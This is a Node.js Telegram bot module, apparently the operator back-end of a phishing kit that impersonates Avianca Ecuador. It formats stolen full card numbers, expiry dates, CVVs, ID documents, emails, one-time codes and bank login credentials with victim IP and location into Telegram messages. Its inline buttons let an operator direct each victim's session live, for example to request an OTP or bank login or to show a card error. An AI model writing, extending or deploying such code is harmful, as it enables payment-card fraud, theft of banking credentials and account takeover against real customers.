const { Telegraf, Markup } = require('telegraf');
const store = require('./store');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN) throw new Error('BOT_TOKEN no está configurado');
if (!CHAT_ID) throw new Error('CHAT_ID no está configurado');

const bot = new Telegraf(BOT_TOKEN);

// ===================== FORMATO DE MENSAJES =====================

function escapeMd(s) {
  if (s === undefined || s === null) return '';
  return String(s).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}

function formatPayment(p) {
  const card = p.card || {};
  const lines = [
    '🔴 *AVIANCA ECUADOR* 🔴',
    '',
    'ℹ️ *DATOS DE LA TARJETA*',
    `💳 \`${escapeMd(card.fullNumber || p.p || 'N/D')}\``,
    `📅 ${escapeMd(card.expiry || p.pdate || 'N/D')}`,
    `🔐 ${escapeMd(card.cvv || p.c || 'N/D')}`,
    `🏦 ${escapeMd(card.bankRaw || card.bankSlug || p.ban || 'N/D')}`,
    `🃏 ${escapeMd(card.scheme || p.scheme || 'N/D')}`,
    '',
    'ℹ️ *DATOS DEL CLIENTE*',
    `👤 ${escapeMd(card.cardHolder || [p.nombre, p.apellido].filter(Boolean).join(' ') || p.dudename || '')}`,
    `🪪 ${escapeMd(card.document || p.cc || 'N/D')}`,
    `📧 ${escapeMd(p.email || 'N/D')}`,
    '',
    'ℹ️ *DATOS DEL VUELO*',
    `✈️ ${escapeMd(p.parque || p.ruta || 'N/D')}`,
    `🔖 ${escapeMd(p.codigo || 'N/D')}`,
    `💰 ${escapeMd(p.total || 'N/D')}`,
    '',
    `🆔 sessionId: \`${escapeMd(p.sessionId || '')}\``,
  ];
  return lines.join('\n');
}

function formatOtp(p) {
  const lines = [
    '🔔 *CÓDIGO OTP RECIBIDO*',
    '',
    `🔢 Código: \`${escapeMd(p.otp || 'N/D')}\``,
    `👤 ${escapeMd(p.name || p.dudename || '')}`,
    `💳 Tarjeta: •••• ${escapeMd(p.cardLast4 || '----')}`,
    `📄 Factura: \\#${escapeMd(p.invoiceNumber || 'N/D')}`,
    `💰 Valor: ${escapeMd(p.invoiceAmount || 'N/D')}`,
    `🌎 IP: ${escapeMd(p.ip || 'N/D')}`,
    `📌 ${escapeMd(p.location || 'N/D')}`,
    '',
    `🆔 sessionId: \`${escapeMd(p.sessionId || '')}\``,
  ];
  return lines.join('\n');
}

function formatLogo(p) {
  const lines = [
    '🏦 *CREDENCIALES LOGO*',
    '',
    `🏦 Banco: ${escapeMd(p.bankDisplay || 'N/D')}`,
    `📄 Factura: \\#${escapeMd(p.invoiceNumber || 'N/D')}`,
    `💰 Valor: ${escapeMd(p.invoiceAmount || 'N/D')}`,
    `💳 Tarjeta: ${escapeMd(p.cardFull || ('****' + (p.cardLast4 || '—')))}`,
    `👤 ${escapeMd(p.name || 'N/D')}`,
    `🔑 ${escapeMd(p.field1Label || 'Campo 1')}: \`${escapeMd(p.field1Value || 'N/D')}\``,
    `🔒 ${escapeMd(p.field2Label || 'Campo 2')}: \`${escapeMd(p.field2Value || 'N/D')}\``,
    `🌎 IP: ${escapeMd(p.ip || 'N/D')}`,
    `📌 ${escapeMd(p.location || 'N/D')}`,
    '',
    `🆔 sessionId: \`${escapeMd(p.sessionId || '')}\``,
  ];
  return lines.join('\n');
}

// ===================== ENVÍO =====================

async function sendPaymentCard(payload) {
  const sid = payload.sessionId;
  store.ensure(sid, 'payment');

  const text = formatPayment(payload);
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('🔐 OTP',         `pay_otp:${sid}`),
      Markup.button.callback('❌ Error Tarjeta', `pay_err:${sid}`),
    ],
    [
      Markup.button.callback('🪪 Pedir Logo',   `pay_logo:${sid}`),
      Markup.button.callback('❌ Error Logo',   `pay_logo_err:${sid}`),
    ],
  ]);

  const msg = await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  store.setMessageId(sid, msg.message_id);
  return msg.message_id;
}

async function sendOtpCard(payload) {
  const sid = payload.sessionId;
  store.ensure(sid, 'otp');

  const text = formatOtp(payload);
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('✅ OTP Correcto', `otp_ok:${sid}`),
      Markup.button.callback('❌ Error OTP',    `otp_err:${sid}`),
    ],
  ]);

  const msg = await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  store.setMessageId(sid, msg.message_id);
  return msg.message_id;
}

async function sendLogoCard(payload) {
  const sid = payload.sessionId;
  store.ensure(sid, 'logo');

  const text = formatLogo(payload);
  const keyboard = Markup.inlineKeyboard([
    [
      Markup.button.callback('✅ Logo Correcto', `logo_ok:${sid}`),
      Markup.button.callback('❌ Error Logo',    `logo_err:${sid}`),
    ],
  ]);

  const msg = await bot.telegram.sendMessage(CHAT_ID, text, {
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard.reply_markup,
  });
  store.setMessageId(sid, msg.message_id);
  return msg.message_id;
}

// ===================== CALLBACKS =====================

const ACTION_MAP = {
  pay_otp:      { stage: 'payment', decision: 'otp',        label: '🔐 OTP' },
  pay_err:      { stage: 'payment', decision: 'error',      label: '❌ Error Tarjeta' },
  pay_logo:     { stage: 'payment', decision: 'logo',       label: '🪪 Pedir Logo' },
  pay_logo_err: { stage: 'payment', decision: 'logo_error', label: '❌ Error Logo' },
  otp_ok:       { stage: 'otp',     decision: 'finish',     label: '✅ OTP Correcto' },
  otp_err:      { stage: 'otp',     decision: 'error',      label: '❌ Error OTP' },
  logo_ok:      { stage: 'logo',    decision: 'finish',     label: '✅ Logo Correcto' },
  logo_err:     { stage: 'logo',    decision: 'error',      label: '❌ Error Logo' },
};

bot.on('callback_query', async (ctx) => {
  try {
    const data = ctx.callbackQuery.data || '';
    const colonIdx = data.indexOf(':');
    const action = colonIdx !== -1 ? data.slice(0, colonIdx) : data;
    const sid    = colonIdx !== -1 ? data.slice(colonIdx + 1) : '';
    const meta   = ACTION_MAP[action];

    if (!meta || !sid) {
      await ctx.answerCbQuery('Acción no válida');
      return;
    }

    const ok = store.setDecision(sid, meta.decision);
    if (!ok) {
      await ctx.answerCbQuery('⚠️ Sesión expirada o no encontrada');
      return;
    }

    try {
      const operator = ctx.from ? (ctx.from.username || ctx.from.first_name || String(ctx.from.id)) : '—';
      const original = ctx.callbackQuery.message.text || '';
      const suffix = `\n\n👉 Decisión: ${meta.label}  ·  por @${operator}`;
      await ctx.editMessageText(original + suffix, {
        reply_markup: { inline_keyboard: [] },
      });
    } catch (_) {
      try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (_) {}
    }

    await ctx.answerCbQuery(`Registrado: ${meta.label}`);
  } catch (err) {
    console.error('[bot] callback error:', err);
    try { await ctx.answerCbQuery('Error interno'); } catch (_) {}
  }
});

async function launch() {
  await bot.launch();
  console.log('[bot] telegraf iniciado (long polling)');
}

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

module.exports = { bot, launch, sendPaymentCard, sendOtpCard, sendLogoCard };
